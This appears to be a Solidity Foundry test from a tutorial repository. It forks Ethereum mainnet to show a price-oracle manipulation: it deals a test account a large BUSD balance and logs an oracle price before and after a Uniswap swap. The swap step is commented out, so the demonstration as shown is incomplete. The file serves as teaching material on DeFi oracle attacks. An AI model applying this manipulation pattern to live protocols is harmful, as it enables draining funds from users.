// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract wtfsolidity_safe is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // fork指定区块
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        vm.startPrank(alice);
        
        console.log("pair address: %s", address(ousd.pair())); 
        // 操纵预言机之前的价格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        
        // swap
        // 给自己账户 1000000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        console.log("BUSD balance of alice: %s", busd.balanceOf(alice)/10e18);
        
        busd.approve(address(this), busdAmount);
        busd.transferFrom(msg.sender, address(this), 1);

        //swapSingleHopExactAmountIn(busdAmount, 0);


        // 操纵预言机之后的价格
        uint256 priceAfter = ousd.getPrice();
        console.log("2. after attack: price: %s", priceAfter); 

        vm.stopPrank();
    }

    // Swap BUSD to WETH
    function swapSingleHopExactAmountIn(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.transferFrom(msg.sender, address(this), amountIn);
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            msg.sender,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IBUSD is IERC20 {
    function balanceOf(address account) external view returns (uint);
}

